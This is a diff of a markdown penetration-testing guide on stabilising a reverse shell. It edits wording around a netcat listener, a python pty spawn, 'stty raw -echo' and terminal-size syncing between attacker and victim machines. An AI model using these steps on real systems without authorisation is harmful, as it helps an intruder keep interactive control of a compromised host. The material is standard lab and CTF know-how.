@@ -57,7 +57,7 @@ rlwrap nc -lvp 4444
 python -V
 python3 -V
 ```
-#### Make sure to use the correct version of python for next command
+#### Make sure to use the correct version of python for next command!
 ```
 python -c 'import pty; pty.spawn("/bin/bash")' 
 SHELL=/bin/bash script -q /dev/null (if your machine doesn't have python)
@@ -68,7 +68,8 @@ Ctrl + Z (background the shell)
 stty raw -echo; fg
 reset
 ```
-## If it asks what TERM to use, set it to 'xterm-256color'
+If it asks what TERM to use, set it to 'xterm-256color', or whatever your attacker machine's $TERM is set to. 
+
 ### Validate Terminal Type
 ```
 echo $TERM
@@ -89,6 +90,6 @@ echo $TERM && tput lines && tput cols (run on attacker)
 stty rows 38 columns 116 (run on victim)
 ```
 Note: you'll want to run the second command with numbers from the first command, so you're setting the victim's shell size to your local kali machine's shell size. 
-This helps prevent wordwrap from distorting and will help other tools like nano and vim work as expected.
+This helps prevent wordwrap from distorting the shell and will help other tools like nano and vim work as expected.
 
 You should now have a fully functional shell, where even sending a ^C (Ctrl + C, normally intended to stop processes) won't cause the shell to die. 
